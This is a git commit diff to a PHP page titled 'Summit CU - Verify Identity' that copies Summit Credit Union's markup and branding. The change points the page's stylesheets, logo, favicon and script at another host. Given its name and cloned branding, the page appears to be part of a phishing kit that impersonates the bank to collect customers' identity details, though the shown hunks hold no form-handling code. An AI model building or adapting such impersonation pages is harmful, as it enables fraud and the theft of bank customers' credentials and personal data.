5ca935f16fce16d1729b07773d854fe83cca820a
X-botf <168183930+X-botf@users.noreply.github.com>
2024-10-17 07:51:40 -0400

    Update Verif3.php

--- api/Verif3.php
+++ api/Verif3.php
@@ -3,9 +3,9 @@
 <head><meta charset="us-ascii">
 	<title>Summit CU - Verify Identity</title>
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-	<link href="https://db.summitcreditunion.com/Themes/OrpheusDefaultTheme/Styles/Default_5rTVJABMXj81_Default.bndl?v=ZnIFqDdKR7A2O6jJVTNgoswC4KLo4jWAssDj-YT4lno1" rel="stylesheet" type="text/css" />
-	<link href="https://db.summitcreditunion.com/Themes/OrpheusDefaultTheme/Styles/Mobile_Default_xtHDspGhEo41_Default.bndl?v=SQRLFviIS39Q1hMZ0ZGDFJMW45OESxRev1bTrzViMSg1" rel="stylesheet" type="text/css" /><meta content="Orchard" name="generator"><meta content="h9-JYPObT2yjBZKP52RA-uNaFyUg92WUSpmtuN6qyE4q226CbQbtFJCJNPJQSPW78NN4ka_D5iS3Nd_EYsp6xWrttILMZrKum1dCN9KEgiyGaLZkmhnwxKH38v-pBcDEmbxVG9Zea4WeIhMSUxNycGMRKb3Tk8Nu7--wrUv-r9Q1" name="csrf-token"><meta content="X-AntiCSRF-Token" name="csrf-param"><meta content="__AntiCsrfToken" name="csrf-form-param">
-	<link href="https://db.summitcreditunion.com/Media/Default/Logos/favicon_1.ico" rel="shortcut icon" type="image/x-icon" /><meta name="apple-itunes-app" content="app-id=846243037">
+	<link href="https://bulldogfcu.financialhost.org/Themes/OrpheusDefaultTheme/Styles/Default_5rTVJABMXj81_Default.bndl?v=ZnIFqDdKR7A2O6jJVTNgoswC4KLo4jWAssDj-YT4lno1" rel="stylesheet" type="text/css" />
+	<link href="https://bulldogfcu.financialhost.org/Themes/OrpheusDefaultTheme/Styles/Mobile_Default_xtHDspGhEo41_Default.bndl?v=SQRLFviIS39Q1hMZ0ZGDFJMW45OESxRev1bTrzViMSg1" rel="stylesheet" type="text/css" /><meta content="Orchard" name="generator"><meta content="h9-JYPObT2yjBZKP52RA-uNaFyUg92WUSpmtuN6qyE4q226CbQbtFJCJNPJQSPW78NN4ka_D5iS3Nd_EYsp6xWrttILMZrKum1dCN9KEgiyGaLZkmhnwxKH38v-pBcDEmbxVG9Zea4WeIhMSUxNycGMRKb3Tk8Nu7--wrUv-r9Q1" name="csrf-token"><meta content="X-AntiCSRF-Token" name="csrf-param"><meta content="__AntiCsrfToken" name="csrf-form-param">
+	<link href="https://bulldogfcu.financialhost.org/Media/Default/Logos/favicon_1.ico" rel="shortcut icon" type="image/x-icon" /><meta name="apple-itunes-app" content="app-id=1554483296">
 </head>
 <body><script>
     window.Chorus = window.Chorus || {};
@@ -17,7 +17,7 @@
 </script>
 <header class="navbar" role="banner">
 <div class="navbar__center">
-<div class="top-logo-block" style="text-align: center; display: block; width: 100%; margin: 10px auto;"><a href="https://db.summitcreditunion.com/"><img alt="Summit Credit Union" height="80" src="https://db.summitcreditunion.com/Media/Default/Logos/summit_logo.png" width="186" /> </a>
+<div class="top-logo-block" style="text-align: center; display: block; width: 100%; margin: 10px auto;"><a href="https://bulldogfcu.financialhost.org/"><img alt="Summit Credit Union" height="80" src="https://bulldogfcu.financialhost.org/Media/Default/Logos/summit_logo.png" width="186" /> </a>
 <div style="background-color: #ebf2e6; padding: 20px; border: 1px solid #b2c8a2; border-radius: 6px; max-width: 560px; margin: 20px auto 0px auto; text-align: center;">Welcome, former Commerce business customers!<br />
 <a href="https://summitcreditunion.ebanking-services.com/eAM/Credential/Index?appId=beb&amp;brand=summitcreditunion" style="text-decoration: underline;">Access your accounts here.</a></div>
 <br />
@@ -62,4 +62,4 @@
 </div>
 </div>
 </div>
-<script src="https://db.summitcreditunion.com/bundle/script/Unspecified/S7mF27WFE7g1_Default.bndl?v=XDdrknP3VNCvB0-2__cLpO4XRRnmbOjV_Nwsefyqxk01" type="text/javascript"></script></html>
+<script src="https://bulldogfcu.financialhost.org/bundle/script/Unspecified/S7mF27WFE7g1_Default.bndl?v=XDdrknP3VNCvB0-2__cLpO4XRRnmbOjV_Nwsefyqxk01" type="text/javascript"></script></html>
